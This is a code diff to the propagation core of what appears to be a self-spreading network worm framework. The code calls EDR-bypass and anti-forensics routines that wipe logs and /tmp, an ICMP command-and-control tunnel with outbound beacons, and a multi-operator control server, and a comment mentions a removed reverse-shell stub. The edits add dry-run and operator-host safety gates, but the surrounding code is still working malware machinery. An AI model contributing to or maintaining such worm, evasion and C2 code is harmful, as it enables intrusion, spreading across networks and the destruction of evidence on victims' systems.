@@ -185,7 +185,13 @@ class WormCorePropagation:
         if not self.distributed_redundancy:
             return
 
-        for ip in self.infected_hosts:
+        # Snapshot under the data lock: worker threads (wave propagation,
+        # lateral movement) mutate infected_hosts concurrently and a bare
+        # `for ip in self.infected_hosts:` raises RuntimeError ("Set changed
+        # size during iteration") mid-propagation.
+        with self._data_lock:
+            infected = list(self.infected_hosts)
+        for ip in infected:
             if ip != ("127.0.0.1" if self.dry_run else get_local_ip()):
                 self.distributed_redundancy.add_peer(ip)
 
@@ -205,6 +211,13 @@ class WormCorePropagation:
         target -- code that made no sense operationally and endangered the
         operator. Remote payload delivery belongs to the agent_controller
         task queue, never to local execution.
+
+        LOCAL-HOST GUARD: the anti-forensics / EDR-bypass blocks below
+        operate on the OPERATOR machine (AntiForensics and EDRBypass have no
+        remote target), yet their logs claim action "on {ip}". Running them
+        unconditionally truncates the operator's /var/log/*, deletes every
+        file in /tmp, and patches AMSI/ETW of the operator process.
+        They are therefore opt-in via WORMY_LOCAL_POSTEXPLOIT=1.
         """
         if self.dry_run:
             logger.debug(f"[DRY RUN] Skipping post-exploitation cleanup for {ip}")
@@ -212,33 +225,50 @@ class WormCorePropagation:
 
         os_guess = target.get("os_guess", "Unknown").lower()
 
-        if "windows" in os_guess:
-            try:
-                edr_detected = self.edr_bypass.detect_edr()
-                if edr_detected:
-                    logger.warning(f"EDR detected on {ip}: {edr_detected}")
-                    bypass_results = self.edr_bypass.apply_all_bypasses()
-                    successful_bypasses = [k for k, v in bypass_results.items() if v]
-                    if successful_bypasses:
-                        logger.success(f"EDR bypass successful on {ip}: {successful_bypasses}")
-                        self._detection_events.append(
-                            {
-                                "type": "edr_bypass",
-                                "ip": ip,
-                                "techniques": successful_bypasses,
-                                "timestamp": datetime.now().isoformat(),
-                            }
-                        )
-            except Exception as e:
-                logger.debug(f"EDR bypass failed on {ip}: {e}")
+        local_postexploit = os.environ.get("WORMY_LOCAL_POSTEXPLOIT", "").strip().lower() in (
+            "1",
+            "yes",
+            "true",
+        )
 
-        try:
-            cleanup_results = self.anti_forensics.clean_all_tracks()
-            successful_cleanups = [k for k, v in cleanup_results.items() if v]
-            if successful_cleanups:
-                logger.debug(f"Anti-forensics cleanup on {ip}: {successful_cleanups}")
-        except Exception as e:
-            logger.debug(f"Anti-forensics failed on {ip}: {e}")
+        if not local_postexploit:
+            logger.info(
+                f"Post-exploitation: local anti-forensics/EDR-bypass skipped "
+                f"(operator-host protection; opt in with WORMY_LOCAL_POSTEXPLOIT=1)"
+            )
+        else:
+            logger.warning(
+                "WORMY_LOCAL_POSTEXPLOIT=1: local anti-forensics/EDR-bypass enabled -- "
+                "these act on the OPERATOR host, not on the target"
+            )
+
+            if "windows" in os_guess:
+                try:
+                    edr_detected = self.edr_bypass.detect_edr()
+                    if edr_detected:
+                        logger.warning(f"EDR detected on {ip}: {edr_detected}")
+                        bypass_results = self.edr_bypass.apply_all_bypasses()
+                        successful_bypasses = [k for k, v in bypass_results.items() if v]
+                        if successful_bypasses:
+                            logger.success(f"EDR bypass successful on {ip}: {successful_bypasses}")
+                            self._detection_events.append(
+                                {
+                                    "type": "edr_bypass",
+                                    "ip": ip,
+                                    "techniques": successful_bypasses,
+                                    "timestamp": datetime.now().isoformat(),
+                                }
+                            )
+                except Exception as e:
+                    logger.debug(f"EDR bypass failed on {ip}: {e}")
+
+            try:
+                cleanup_results = self.anti_forensics.clean_all_tracks()
+                successful_cleanups = [k for k, v in cleanup_results.items() if v]
+                if successful_cleanups:
+                    logger.debug(f"Anti-forensics cleanup on {ip}: {successful_cleanups}")
+            except Exception as e:
+                logger.debug(f"Anti-forensics failed on {ip}: {e}")
 
         # NOTE: local in-memory payload execution was REMOVED. It ran a live
         # reverse-shell stub on the operator machine (see docstring).
@@ -338,20 +368,32 @@ class WormCorePropagation:
                 logger.warning(f"Failed to start Armitage Dashboard: {e}")
 
         if self.multi_operator:
-            try:
-                self.multi_operator.start(background=True)
-                logger.info("Multi-Operator Server started on port 8444")
-            except Exception as e:
-                logger.warning(f"Multi-Operator Server failed to start: {e}")
+            if self.dry_run:
+                # DRY-RUN GATE: the multi-operator control plane (login,
+                # command dispatch) makes no sense in a simulation and only
+                # widens the attack surface -- do not start it.
+                logger.info("[DRY RUN] Multi-Operator Server not started (simulation only)")
+            else:
+                try:
+                    self.multi_operator.start(background=True)
+                    logger.info("Multi-Operator Server started on port 8444")
+                except Exception as e:
+                    logger.warning(f"Multi-Operator Server failed to start: {e}")
 
         if self.icmp_tunnel:
-            try:
-                self.icmp_tunnel.start_listener(
-                    callback=lambda msg: logger.debug(f"ICMP msg: {msg}")
-                )
-                logger.info("ICMP Tunnel listener started")
-            except Exception as e:
-                logger.warning(f"ICMP Tunnel listener failed: {e}")
+            if self.dry_run:
+                # DRY-RUN GATE: the ICMP listener opens a raw socket and the
+                # beacon path performs real sendto() traffic; keep dry-run
+                # strictly loopback/simulation-only.
+                logger.info("[DRY RUN] ICMP Tunnel listener not started (simulation only)")
+            else:
+                try:
+                    self.icmp_tunnel.start_listener(
+                        callback=lambda msg: logger.debug(f"ICMP msg: {msg}")
+                    )
+                    logger.info("ICMP Tunnel listener started")
+                except Exception as e:
+                    logger.warning(f"ICMP Tunnel listener failed: {e}")
 
         if self.local_persistence and not self.dry_run:
             # Local persistence on the OPERATOR machine is a real, invasive
@@ -470,7 +512,10 @@ class WormCorePropagation:
                 except Exception:
                     pass
 
-            if self.icmp_tunnel and target["ip"] in self.infected_hosts:
+            if self.icmp_tunnel and not self.dry_run and target["ip"] in self.infected_hosts:
+                # DRY-RUN GATE: ICMPTunnel.beacon() performs a real
+                # sendto() of an ICMP echo packet; simulated infections in
+                # dry-run must not generate outbound C2 traffic.
                 try:
                     self.icmp_tunnel.beacon(
                         {
